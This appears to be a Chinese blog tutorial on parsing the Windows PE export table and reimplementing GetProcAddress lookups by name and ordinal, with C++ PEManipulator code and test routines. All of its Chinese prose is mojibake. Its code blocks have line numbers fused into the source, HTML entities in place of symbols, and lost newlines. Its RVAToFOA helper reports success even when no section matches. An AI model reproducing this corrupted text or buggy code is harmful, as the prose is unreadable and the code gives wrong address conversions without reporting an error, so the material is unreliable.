LPCSTR lpProcName // ä¼ å‡½æ•°åæˆ–åºå·); åœ¨æœ¬æ–‡çš„ä¸Šé¢ï¼Œæˆ‘ä»¬è·å–åˆ°äº†å¦‚ä¸‹ä¸‰å¼ è¡¨çš„ä¿¡æ¯ï¼Œç°åœ¨æˆ‘ä»¬æ¥è®²è¿°ç”¨GetProcAddressè·å–å¯¼å‡ºå‡½æ•°åœ°å€çš„è¿‡ç¨‹ï¼ˆå°±æ˜¯GetProcAddresså‡½æ•°çš„å†…éƒ¨å®ç°ï¼‰ã€‚ ä»¥å‡½æ•°åæ¥å¯»æ‰¾ å½“GetProcAddressç¬¬äºŒä¸ªå‚æ•°ä¼ çš„æ˜¯å‡½æ•°åï¼ŒæŸ¥æ‰¾å¯¼å‡ºå‡½æ•°åœ°å€çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š åœ¨å¯¼å‡ºå‡½æ•°åç§°è¡¨æŸ¥è¿™ä¸ªå‡½æ•°ååœ¨è¿™å¼ è¡¨ä¸­å¯¹åº”çš„æ•°ç»„ç´¢å¼•å·ï¼Œå‡è®¾è®°ä¸ºname_index ä»¥name_indexä½œä¸ºæ•°ç»„ç´¢å¼•ï¼Œå»å¯¼å‡ºå‡½æ•°åºå·è¡¨æŸ¥å¯¹åº”é¡¹ï¼Œå¾—åˆ°åºå·ordinal ä»¥ordinalä½œä¸ºæ•°ç»„ç´¢å¼•ï¼Œå»å¯¼å‡ºå‡½æ•°åœ°å€è¡¨æŸ¥å¯¹åº”é¡¹ï¼Œå¾—åˆ°å‡½æ•°åœ°å€ ä¾‹ 1GetProcAddress(hModule, &quot;Div&quot;); Divåœ¨å¯¼å‡ºå‡½æ•°åç§°è¡¨ä¸­æ˜¯ç¬¬0é¡¹ å¯¼å‡ºå‡½æ•°åç§°è¡¨ç¬¬0é¡¹å†…å®¹æ˜¯5 å¯¼å‡ºå‡½æ•°åœ°å€è¡¨ç¬¬5é¡¹å†…å®¹æ˜¯0x00001005 äºæ˜¯GetProcAddress(hModule, â€œDivâ€)è¿”å›0x00001005 ä»¥åºå·æ¥å¯»æ‰¾ å½“GetProcAddressç¬¬äºŒä¸ªå‚æ•°ä¼ çš„æ˜¯åºå·ï¼ŒæŸ¥æ‰¾å¯¼å‡ºå‡½æ•°åœ°å€çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š ç”¨åºå·å‡å»Baseï¼ˆèµ·å§‹åºå·ï¼‰å¾—åˆ°ä¸€ä¸ªå€¼ ä½¿ç”¨æ­¥éª¤1å¾—åˆ°çš„è¿™ä¸ªå€¼ä½œä¸ºæ•°ç»„ç´¢å¼•ï¼Œåœ¨å¯¼å‡ºå‡½æ•°åœ°å€è¡¨æŸ¥å¯¹åº”é¡¹ï¼Œå¾—åˆ°å‡½æ•°åœ°å€ ä¾‹ 1GetProcAddress(hModule, 17); 17-Baseï¼ˆ12ï¼‰=5 å¯¼å‡ºå‡½æ•°åœ°å€è¡¨ç¬¬5é¡¹å†…å®¹æ˜¯0x00001005 äºæ˜¯GetProcAddress(hModule, 17)è¿”å›0x00001005 æˆ–è®©å¯¼å‡ºå‡½æ•°åœ°å€è¡¨çš„ç´¢å¼•+ä¸ŠBaseï¼Œé‚£ä¹ˆå¯¼å‡ºå‡½æ•°åœ°å€è¡¨é¡¹æ•°å’Œåºå·å¯¹åº”å¦‚ä¸‹ï¼š ç¬¬0é¡¹ï¼Œå¯¹åº”åºå·12 ç¬¬1é¡¹ï¼Œå¯¹åº”åºå·13 ç¬¬2é¡¹ï¼Œå¯¹åº”åºå·14 ç¬¬3é¡¹ï¼Œå¯¹åº”åºå·15 ç¬¬4é¡¹ï¼Œå¯¹åº”åºå·16 ç¬¬5é¡¹ï¼Œå¯¹åº”åºå·17 ç„¶åæ‹¿ä¼ çš„åºå·17å»å¯¼å‡ºå‡½æ•°åœ°å€è¡¨æŸ¥åºå·17è¡¨é¡¹å†…å®¹æ˜¯å¤šå°‘ï¼Œä¸€æ ·çš„ã€‚ å°ç»“ ä»¥å‡½æ•°åæŸ¥å‡½æ•°åœ°å€ï¼Œè¦ç”¨åˆ°åç§°è¡¨ï¼Œåºå·è¡¨ï¼Œåœ°å€è¡¨ ä»¥å¯¼å‡ºåºå·æŸ¥å‡½æ•°åœ°å€ï¼Œåªéœ€è¦åœ°å€è¡¨ ä¸ºä»€ä¹ˆè¦æœ‰åºå·è¡¨ ä»¥ä¸Šé¢ç”¨å‡½æ•°åDivæŸ¥çœ‹å‡½æ•°åœ°å€çš„è¿‡ç¨‹ä¸ºä¾‹ å¦‚æœDivè¿˜æœ‰ä¸€ä¸ªåˆ«åï¼Œå‡è®¾ä¸ºrDiv1ï¼ˆå‰é¢çš„rä¸ºäº†å­—ç¬¦ä¸²æ’åºåŠ çš„ï¼Œæ²¡å…¶ä»–æ„æ€ï¼‰ï¼Œé‚£ä¹ˆåç§°è¡¨ä¼šå¤šä¸€é¡¹åç§°è¡¨[3]=&quot;rDiv1&quot;å­—ç¬¦ä¸²çš„åœ°å€ã€‚ å½“ä½¿ç”¨Divå’ŒrDiv1åç§°å»åç§°è¡¨æŸ¥åºå·ï¼ŒæŸ¥Divå’ŒrDiv1å¾—åˆ°çš„æ•°ç»„ç´¢å¼•å·è‚¯å®šæ˜¯ä¸ä¸€æ ·çš„ï¼ŒDivæ˜¯0ï¼ŒrDiv1æ˜¯3ã€‚ Divå’ŒrDiv1å®é™…ä¸Šéƒ½æ˜¯åŒä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œæ‰€ä»¥åœ¨åç§°è¡¨å’Œåœ°å€è¡¨ä¹‹é—´å†åŠ ä¸€ä¸ªåºå·è¡¨ä½œä¸ºä¸­è½¬ï¼Œç”¨äºç”¨äºè¿æ¥åç§°è¡¨å’Œåœ°å€è¡¨ã€‚ å°ç»“ï¼šåºå·è¡¨å­˜åœ¨çš„æ„ä¹‰ä¸ºäº†åº”å¯¹æœ‰å‡½æ•°åˆ«åçš„æƒ…å†µï¼Œåºå·è¡¨ç”¨äºè¿æ¥åç§°è¡¨å’Œåœ°å€è¡¨ã€‚ ä½†ç»è¿‡å®éªŒå‘ç°ï¼Œå­˜åœ¨åˆ«åçš„æƒ…å†µä¸‹ï¼Œåºå·è¡¨å¯¹ä»åç§°è¡¨å¾—åˆ°çš„ç´¢å¼•è¿˜æ˜¯â€œæ˜ å°„â€æˆä¸åŒçš„å€¼ï¼Œåœ°å€è¡¨ä¹Ÿåˆå­˜äº†ä¸€ä»½åˆ«åçš„å‡½æ•°åœ°å€ã€‚è€Œä¸ä¼šè®©åºå·è¡¨é‡Œå¤šä¸ªåºå·æŒ‡å‘åœ°å€è¡¨åŒä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œå…·ä½“å¯è§è¿™ç¯‡æ–‡ç« ã€‚ æœ¬æ¥ç”¨åºå·è¡¨å¯ä»¥ä¼˜åŒ–æˆï¼š ç»“æœæ˜¯è¿™ä¸ªæ ·å­ï¼šç®—ä¸Šåˆ«å2æ¬¡ï¼ŒåŠ ä¸ŠPlusæœ¬åï¼Œå®ƒå°†Pluså‡½æ•°å‡½æ•°åœ°å€åœ¨åœ°å€è¡¨å­˜äº†3éï¼ å°å£°bbï¼šæœ‰åˆ«åï¼Œåœ°å€è¡¨å°±å¤šå­˜ä¸€ä»½ã€‚é‚£éƒ½æ²¡å¿…è¦ç”¨åºå·è¡¨äº†ï¼Œå»åç§°è¡¨æŸ¥å¾—åˆ°ç´¢å¼•ï¼Œç›´æ¥æ‹¿ç´¢å¼•å»åœ°å€è¡¨æŸ¥å°±è¡Œäº†ã€‚ ç¼–ç¨‹å®ç° è¾…åŠ©å‡½æ•° å¯¼å‡ºè¡¨æŒ‡é’ˆè·å–RVAè½¬FOAè·å–FileBufferä¸­å¯¼å‡ºè¡¨æŒ‡é’ˆ123456789101112131415161718PIMAGE_EXPORT_DIRECTORY PEManipulator::GetExportDirectoryPointer()&#123; DWORD dwExportDirectoryRVA = m_OptionalPeHdr-&gt;DataDirectory[0].VirtualAddress; if (dwExportDirectoryRVA == 0) &#123; printf(&quot;[-] Error: DataDirectory[0].VirtualAddress is Empty &quot;); return nullptr; &#125; DWORD dwExportDirectoryFOA = 0; if (!RVAToFOA(dwExportDirectoryRVA, dwExportDirectoryFOA)) &#123; printf(&quot;[-] Error: Failed to convert RVA to FOA &quot;); return nullptr; &#125; return (PIMAGE_EXPORT_DIRECTORY)((DWORD)m_lpFileBuffer + dwExportDirectoryFOA);&#125;RVAè½¬FOA123456789101112131415161718192021222324252627282930BOOL PEManipulator::RVAToFOA(DWORD dwRVA, OUT DWORD&amp; dwFOA)&#123; dwFOA = 0; // åˆå§‹åŒ– dwFOAï¼Œé˜²æ­¢warning if (dwRVA &lt; 0) //å‚æ•°æ ¡éªŒ &#123; return FALSE; &#125; //RVAåœ¨SizeOfHeadersä»¥å†… æˆ– FileAlignment==SectionAlignment æ—¶FOA=RVA if (dwRVA &lt;= m_OptionalPeHdr-&gt;SizeOfHeaders || m_OptionalPeHdr-&gt;FileAlignment == m_OptionalPeHdr-&gt;SectionAlignment) &#123; dwFOA = dwRVA; return TRUE; &#125; //åœ¨èŠ‚è¡¨ä¸­ for (int i = 0; i &lt; m_PeHdr-&gt;NumberOfSections; i++) &#123; if (m_SecHdr[i].VirtualAddress &lt;= dwRVA &amp;&amp; dwRVA &lt; m_SecHdr[i].VirtualAddress + m_SecHdr[i].Misc.VirtualSize) &#123; //èŠ‚.PointerToRawData + å·®å€¼ //å·®å€¼=RVA-èŠ‚.VirtualAddress dwFOA = m_SecHdr[i].PointerToRawData + (dwRVA - m_SecHdr[i].VirtualAddress); return TRUE; &#125; &#125; return TRUE;&#125; æ‰“å°å¯¼å‡ºè¡¨ æ‰“å°å¯¼å‡ºè¡¨å­—æ®µæ‰“å°åç§°è¡¨æ‰“å°åºå·è¡¨æ‰“å°åœ°å€è¡¨1234567891011121314151617181920212223242526VOID PEManipulator::PrintExportTable()&#123; auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; return; &#125; printf(&quot; Characteristics: 0x%08X &quot;, pExportDirectory-&gt;Characteristics); printf(&quot; TimeDateStamp: 0x%08X &quot;, pExportDirectory-&gt;TimeDateStamp); printf(&quot; MajorVersion: 0x%04X &quot;, pExportDirectory-&gt;MajorVersion); printf(&quot; MinorVersion: 0x%04X &quot;, pExportDirectory-&gt;MinorVersion); DWORD dwNameFOA = 0; if (RVAToFOA(pExportDirectory-&gt;Name, dwNameFOA) == FALSE) &#123; return; &#125; PCHAR cName = (PCHAR)((DWORD)m_lpFileBuffer + dwNameFOA); printf(&quot; Name: 0x%08X (\\&quot;%s\\&quot;) &quot;, pExportDirectory-&gt;Name, cName); printf(&quot; Base: 0x%08X &quot;, pExportDirectory-&gt;Base); printf(&quot; NumberOfFunctions: 0x%08X &quot;, pExportDirectory-&gt;NumberOfFunctions); printf(&quot; NumberOfNames: 0x%08X &quot;, pExportDirectory-&gt;NumberOfNames); printf(&quot; AddressOfFunctions: 0x%08X &quot;, pExportDirectory-&gt;AddressOfFunctions); printf(&quot; AddressOfNames: 0x%08X &quot;, pExportDirectory-&gt;AddressOfNames); printf(&quot; AddressOfNameOrdinals: 0x%08X &quot;, pExportDirectory-&gt;AddressOfNameOrdinals);&#125;123456789101112131415161718192021222324252627282930313233VOID PEManipulator::PrintNameTable()&#123; //è·å–å¯¼å‡ºè¡¨æŒ‡é’ˆ auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; return; &#125; //è·å–å‡½æ•°åç§°è¡¨æŒ‡é’ˆ DWORD dwNameTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfNames, dwNameTableFOA)) &#123; return; &#125; auto pNameTable = PDWORD((DWORD)m_lpFileBuffer + dwNameTableFOA); //æ‰“å°å‡½æ•°åç§°è¡¨å†…å®¹ printf(&quot; Index Name RVA Name FOA Name &quot;); printf(&quot; ----- ---------- ---------- ---- &quot;); for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123; DWORD dwNameRVA = pNameTable[i]; DWORD dwNameFOA = 0; if (!RVAToFOA(dwNameRVA, dwNameFOA)) &#123; return; &#125; PCHAR Name = (PCHAR)((DWORD)m_lpFileBuffer + dwNameFOA); printf(&quot; %02lu 0x%08X 0x%08X %s &quot;, i, dwNameRVA, dwNameFOA, Name); &#125;&#125;12345678910111213141516171819202122232425VOID PEManipulator::PrintOrdinalTable()&#123; //è·å–å¯¼å‡ºè¡¨æŒ‡é’ˆ auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; return; &#125; //è·å–å¯¼å‡ºå‡½æ•°åºå·è¡¨æŒ‡é’ˆ DWORD dwOrdinalTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfNameOrdinals, dwOrdinalTableFOA)) &#123; return; &#125; auto pOrdinalTable = PWORD((DWORD)m_lpFileBuffer + dwOrdinalTableFOA); //æ‰“å°å‡½æ•°åºå·è¡¨å†…å®¹ printf(&quot; Index Ordinal &quot;); printf(&quot; ----- ------- &quot;); for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123; printf(&quot; %02lu %04d &quot;, i, pOrdinalTable[i]); &#125;&#125;1234567891011121314151617181920212223242526272829303132VOID PEManipulator::PrintFunctionTable()&#123; //è·å–å¯¼å‡ºè¡¨æŒ‡é’ˆ auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; return; &#125; //è·å–å‡½æ•°åœ°å€è¡¨æŒ‡é’ˆ DWORD dwFunctionTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfFunctions, dwFunctionTableFOA)) &#123; return; &#125; auto pFunctionTable = PDWORD((DWORD)m_lpFileBuffer + dwFunctionTableFOA); //æ‰“å°å‡½æ•°åœ°å€è¡¨å†…å®¹ printf(&quot; Index Function RVA Function FOA &quot;); printf(&quot; ----- ------------- ------------- &quot;); for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfFunctions; i++) &#123; DWORD dwFunctionAddressRVA = pFunctionTable[i]; DWORD dwFunctionAddressFOA = 0; if (!RVAToFOA(dwFunctionAddressRVA, dwFunctionAddressFOA)) &#123; return; &#125; printf(&quot; %02lu 0x%08X 0x%08X &quot;, i, dwFunctionAddressRVA, dwFunctionAddressFOA); &#125;&#125; æµ‹è¯•å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041//æµ‹è¯•æ‰“å°å¯¼å‡ºè¡¨int TestPrintExportTable()&#123; //ç”¨æˆ·è¾“å…¥ç‰ˆ //CHAR cFilePath[MAX_PATH]; //printf(&quot;Enter the path of the PE file: &quot;); //fflush(stdout); // ç¡®ä¿è¾“å‡ºç«‹å³æ˜¾ç¤º //if (!fgets(cFilePath, MAX_PATH, stdin)) //&#123; // printf(&quot;[!] Error reading input. &quot;); // return 1; //&#125; //size_t len = strlen(cFilePath);// å»é™¤æœ«å°¾çš„æ¢è¡Œç¬¦ //if (len &gt; 0 &amp;&amp; cFilePath[len - 1] == &#x27; &#x27;) //&#123; // cFilePath[len - 1] = &#x27;\\0&#x27;; //&#125; //PEManipulator PEFile(cFilePath); //å†™æ­»çš„ï¼Œæ–¹ä¾¿æµ‹è¯•ç”¨ PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyDll_VC.dll&quot;); //VCçš„ï¼Œæ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½éƒ½æ˜¯1000h //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VSçš„ï¼Œæ–‡ä»¶å¯¹é½200hï¼Œå†…å­˜å¯¹é½æ˜¯1000h if (!PEFile.MapPEFile()) &#123; return 1; &#125; if (!PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.PrintExportTable(); PEFile.PrintNameTable(); PEFile.PrintOrdinalTable(); PEFile.PrintFunctionTable(); return 0;&#125; æ–‡ä»¶å¯¹é½â‰ å†…å­˜å¯¹é½æ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½æµ‹è¯•çš„dllæºç è¿˜æ˜¯æœ¬æ–‡å‰é¢çš„æºç ï¼Œåœ¨VCä¸‹ç¼–è¯‘ï¼Œæ–‡ä»¶å¯¹é½â‰ å†…å­˜å¯¹é½ æµ‹è¯•çš„dllæºç è¿˜æ˜¯æœ¬æ–‡å‰é¢çš„æºç ï¼Œåœ¨VSä¸‹32ä½ç¼–è¯‘ï¼Œæ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½éƒ½æ˜¯1000h æŸ¥å‡½æ•°åœ°å€è¿‡ç¨‹ ä½œä¸šé¢˜æ˜¯ï¼š GetFunctionAddrByName(FileBufferæŒ‡é’ˆï¼Œå‡½æ•°åæŒ‡é’ˆ) GetFunctionAddrByOrdinals(FileBufferæŒ‡é’ˆï¼Œå‡½æ•°åå¯¼å‡ºåºå·) å› ä¸ºä¿ºæ˜¯ç”¨C++å†™çš„ï¼ŒFileBufferæ˜¯æˆå‘˜å˜é‡ï¼Œæ‰€ä»¥ä¿ºå®ç°çš„ä¸Šé¢ä¸¤ä¸ªå‡½æ•°æ²¡è¿™ä¸ªå‚æ•°ï¼Œä¸é‡è¦ï¼Œé‡ç‚¹æ˜¯å¦‚ä½•é€šè¿‡å‡½æ•°åoråºå·æ¥æŸ¥å‡½æ•°åœ°å€çš„è¿‡ç¨‹ï¼ŒBufferä¸åŒåªæ˜¯PEä¸­ç›¸å…³æŒ‡é’ˆè·å–çš„å˜åŠ¨ã€‚ å¦å¤–ï¼ŒGetFunctionAddrByNameå’ŒGetFunctionAddrByOrdinalså’Œä¸‹é¢GetProcAddressçš„åŒºåˆ«å°±æ˜¯ï¼š FileBufferæ˜¯æœªæ‹‰ä¼¸çš„æ–‡ä»¶æ˜ åƒå†…å­˜ï¼Œæ‰€ä»¥å½“é‡åˆ°RVAçš„å€¼æ—¶ï¼Œéœ€è¦è½¬ä¸ºFOA hModuleæ˜¯dllåŠ è½½è¿›è¿›ç¨‹ç©ºé—´åçš„åŸºå€ï¼Œä¹Ÿå°±æ˜¯å‰é¢å­¦ä¹ çš„ImageBufferï¼Œå³æ‹‰ä¼¸åçš„æ–‡ä»¶æ˜ åƒå†…å­˜ çŸ¥é“GetFunctionAddrByNameå’ŒGetFunctionAddrByOrdinalsæ€ä¹ˆå†™äº†ï¼Œåˆå¹¶æˆGetProcAddressè¿˜éœ€è¦åˆ¤æ–­ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥çš„æ˜¯å‡½æ•°åæˆ–åºå·ã€‚ 1234FARPROC GetProcAddress( HMODULE hModule, // DLLæ¨¡å—å¥æŸ„ LPCSTR lpProcName // ä¼ å‡½æ•°åæˆ–åºå·); ä»¥åºå·æŸ¥è¯¢ GetFunctionAddressByOrdinalsåºå·æŸ¥è¯¢å‡½æ•°å®ç°æµ‹è¯•å‡½æ•°12345678910111213141516171819202122232425262728293031323334DWORD PEManipulator::GetFunctionAddressByOrdinals(DWORD dwFunctionOrdinal)&#123; //è·å–å¯¼å‡ºè¡¨æŒ‡é’ˆ auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; return 0; &#125; //è·å–å‡½æ•°åœ°å€è¡¨æŒ‡é’ˆ DWORD dwFunctionTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfFunctions, dwFunctionTableFOA)) &#123; return 0; &#125; auto pFunctionTable = PDWORD((DWORD)m_lpFileBuffer + dwFunctionTableFOA); //å‡å»Baseè·å¾—çœŸå®åºå· å¹¶ å¯¹è¾“å…¥çš„åºå·åšèŒƒå›´æ£€æŸ¥ DWORD dwRealOrdinalIndex = dwFunctionOrdinal - pExportDirectory-&gt;Base; if (dwRealOrdinalIndex &lt; 0 || dwRealOrdinalIndex &gt;= pExportDirectory-&gt;NumberOfFunctions) &#123; printf(&quot;[-] Error: Function ordinal %d is out of range. &quot;, dwFunctionOrdinal); return 0; &#125; // Fetch the function address by the real ordinal index. DWORD dwfunctionRVA = pFunctionTable[dwRealOrdinalIndex]; if (dwfunctionRVA == 0) &#123; printf(&quot;[-] Error: Function RVA is null, indicating a non-existent function at this ordinal. &quot;); return 0; &#125; return dwfunctionRVA;&#125;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970//æµ‹è¯•é€šè¿‡åºå·è·å–å¯¼å‡ºå‡½æ•°åœ°å€int TestGetFunctionAddressByOrdinals()&#123; //ç”¨æˆ·è¾“å…¥ç‰ˆ //CHAR cFilePath[MAX_PATH]; //printf(&quot;Enter the path of the PE file: &quot;); //fflush(stdout); // ç¡®ä¿è¾“å‡ºç«‹å³æ˜¾ç¤º //if (!fgets(cFilePath, MAX_PATH, stdin)) //&#123; // printf(&quot;[!] Error reading input. &quot;); // return 1; //&#125; //size_t len = strlen(cFilePath);// å»é™¤æœ«å°¾çš„æ¢è¡Œç¬¦ //if (len &gt; 0 &amp;&amp; cFilePath[len - 1] == &#x27; &#x27;) //&#123; // cFilePath[len - 1] = &#x27;\\0&#x27;; //&#125; //PEManipulator PEFile(cFilePath); //å†™æ­»çš„ï¼Œæ–¹ä¾¿æµ‹è¯•ç”¨ //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //æ˜¯PEæ–‡ä»¶ PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyDll_VC.dll&quot;); //VCçš„ if (!PEFile.MapPEFile()) &#123; return 1; &#125; if (!PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.PrintExportTable(); PEFile.PrintFunctionTable(); char input[10]; // å¢å¤§ç¼“å†²åŒºä»¥é˜²æ­¢æº¢å‡º while (true) &#123; printf(&quot; Enter the function ordinal to lookup (Enter &#x27;q&#x27; to exit): &quot;); if (scanf(&quot;%9s&quot;, input) != 1) // ä½¿ç”¨%sæ¥è¯»å–å­—ç¬¦ä¸²ï¼Œé™åˆ¶è¯»å–çš„å­—ç¬¦æ•° &#123; printf(&quot;[!] Invalid input. Please enter a valid number or &#x27;q&#x27; to exit. &quot;); // æ¸…é™¤é”™è¯¯çš„è¾“å…¥ while (getchar() != &#x27; &#x27;); continue; &#125; // æä¾›é€€å‡ºæ¡ä»¶ if (input[0] == &#x27;q&#x27; &amp;&amp; input[1] == &#x27;\\0&#x27;) // ç¡®ä¿åªæœ‰ä¸€ä¸ªå­—ç¬¦&#x27;q&#x27; &#123; break; &#125; DWORD dwOrdinal; if (sscanf(input, &quot;%lu&quot;, &amp;dwOrdinal) == 1) // å°è¯•å°†è¾“å…¥è½¬æ¢ä¸ºæ•°å­— &#123; DWORD dwFunctionAddress = PEFile.GetFunctionAddressByOrdinals(dwOrdinal); if (dwFunctionAddress != 0) &#123; printf(&quot;Function address for ordinal %lu is: 0x%08X &quot;, dwOrdinal, dwFunctionAddress); &#125; &#125; else &#123; printf(&quot;[!] Invalid ordinal. Please enter a valid number or &#x27;q&#x27; to exit. &quot;); &#125; &#125; return 0;&#125; ä»¥å‡½æ•°åæŸ¥è¯¢ GetFunctionAddressByNameä»¥å‡½æ•°åæŸ¥è¯¢çš„å‡½æ•°å®ç°æµ‹è¯•å‡½æ•°1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162DWORD PEManipulator::GetFunctionAddressByName(PCHAR pFunName)&#123; //è·å–å¯¼å‡ºè¡¨æŒ‡é’ˆ auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; return 0; &#125; //è·å–å‡½æ•°åç§°è¡¨æŒ‡é’ˆ DWORD dwNameTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfNames, dwNameTableFOA)) &#123; return 0; &#125; auto pNameTable = PDWORD((DWORD)m_lpFileBuffer + dwNameTableFOA); //è·å–å¯¼å‡ºå‡½æ•°åºå·è¡¨æŒ‡é’ˆ DWORD dwOrdinalTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfNameOrdinals, dwOrdinalTableFOA)) &#123; return 0; &#125; auto pOrdinalTable = PWORD((DWORD)m_lpFileBuffer + dwOrdinalTableFOA); //è·å–å‡½æ•°åœ°å€è¡¨æŒ‡é’ˆ DWORD dwFunctionTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfFunctions, dwFunctionTableFOA)) &#123; return 0; &#125; auto pFunctionTable = PDWORD((DWORD)m_lpFileBuffer + dwFunctionTableFOA); //é€šè¿‡å‡½æ•°åç§°è·å–å‡½æ•°åœ°å€ for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123; DWORD dwNameRVA = pNameTable[i]; DWORD dwNameFOA = 0; if (!RVAToFOA(dwNameRVA, dwNameFOA)) &#123; return 0; &#125; PCHAR pName = (PCHAR)((DWORD)m_lpFileBuffer + dwNameFOA); if (strcmp(pName, pFunName) == 0) &#123; //ä»åºå·è¡¨è·å–å‡½æ•°åºå·è¡¨çš„ç´¢å¼• DWORD dwFunTableIndex = pOrdinalTable[i]; //é€šè¿‡åºå·è¡¨è·å–çš„ç´¢å¼•åœ¨å‡½æ•°åœ°å€è¡¨è·å–å‡½æ•°åœ°å€ DWORD dwFunctionRVA = pFunctionTable[dwFunTableIndex]; if (dwFunctionRVA == 0) &#123; printf(&quot;[-] Error: Function RVA is null, indicating a non-existent function at this index. &quot;); return 0; &#125; return dwFunctionRVA; &#125; &#125; printf(&quot;[-] Error: No function named &#x27;%s&#x27; found in the export table. &quot;, pFunName); return 0;&#125; è¿™é‡Œæä¸€ä¸‹ï¼Œç”¨å‡½æ•°åæŸ¥åç§°è¡¨å¾—åˆ°ç´¢å¼•å·ï¼Œæ‹¿ç€è¿™ä¸ªç´¢å¼•å·å»åœ°å€è¡¨æŸ¥è¡¨ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸å¤ªå¯èƒ½æŸ¥åˆ°åœ°å€ä¸º0ï¼ˆé™¤éè¢«åˆ«äººæ”¹è¿‡è¿™ä¸ªdllçš„å†…å®¹ï¼Œæ­£å¸¸å†™dllçš„è¯ï¼Œæ²¡æ³•å‡ºç°åç§°è¡¨é‡Œçš„åå­—ï¼Œæœ€åå¯¹ä¸Šåœ°å€è¡¨é‡Œä¸€ä¸ªä¸º0çš„å‡½æ•°åœ°å€å§ï¼‰ã€‚ä½†æ˜¯ä»£ç ä¸­è¿˜æ˜¯å¯¹æŸ¥åœ°å€è¡¨æ—¶å¾—åˆ°çš„å‡½æ•°åœ°å€åšäº†æ£€éªŒ 12345if (dwFunctionRVA == 0)&#123; printf(&quot;[-] Error: Function RVA is null, indicating a non-existent function at this index. &quot;); return 0;&#125;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849//æµ‹è¯•é€šè¿‡åºå·è·å–å¯¼å‡ºå‡½æ•°åœ°å€int TestGetFunctionAddressByName()&#123; //å†™æ­»çš„ï¼Œæ–¹ä¾¿æµ‹è¯•ç”¨ PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyDll_VC.dll&quot;); //VCçš„ //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VSçš„ if (!PEFile.MapPEFile()) &#123; return 1; &#125; if (!PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.PrintExportTable(); PEFile.PrintNameTable(); PEFile.PrintOrdinalTable(); PEFile.PrintFunctionTable(); char functionName[256]; while (true) &#123; printf(&quot; Enter function name (&#x27;q&#x27; to quit): &quot;); if (fgets(functionName, sizeof(functionName), stdin) == nullptr) break; // Remove newline character, if present size_t len = strlen(functionName); if (len &gt; 0 &amp;&amp; functionName[len - 1] == &#x27; &#x27;) functionName[len - 1] = &#x27;\\0&#x27;; if (strcmp(functionName, &quot;q&quot;) == 0) break; DWORD functionAddress = PEFile.GetFunctionAddressByName(functionName); if (functionAddress != 0) &#123; printf(&quot;Function &#x27;%s&#x27; address: 0x%08X &quot;, functionName, functionAddress); &#125; else &#123; printf(&quot;Function &#x27;%s&#x27; not found or has no address. &quot;, functionName); &#125; &#125; return 0;&#125; ç”¨LoarPEæ£€æŸ¥ä¸‹ï¼Œé€šè¿‡å‡½æ•°åDivï¼ŒMulï¼ŒPlusæ‰¾åˆ°çš„3ä¸ªå¯¼å‡ºå‡½æ•°åœ°å€æ˜¯æ­£ç¡®çš„ æ‰©å±•ï¼šLordPEåˆå¹¶å¯¼å‡ºè¡¨ä¸‰å¼ å­è¡¨ LordPEçœ‹å¯¼å‡ºè¡¨æ—¶å®ƒä¼šå°†ä¸‰å¼ å­è¡¨çš„ä¿¡æ¯åˆå¹¶ç„¶åè¾“å‡ºï¼š å®ƒçš„åšæ³•æ˜¯ï¼š å»å‡½æ•°åœ°å€è¡¨éå† è¡¨é¡¹çš„å‡½æ•°åœ°å€ä¸º0ï¼Œè·³è¿‡ è¡¨é¡¹çš„å‡½æ•°åœ°å€ä¸ä¸º0ï¼Œåˆ™ç”¨å‡½æ•°åœ°å€çš„è¿™ä¸ªç´¢å¼•å·å»åºå·è¡¨æ‰¾å†…å®¹ä¸ºè¿™ä¸ªå€¼çš„ç´¢å¼•å·æ˜¯å¤šå°‘ 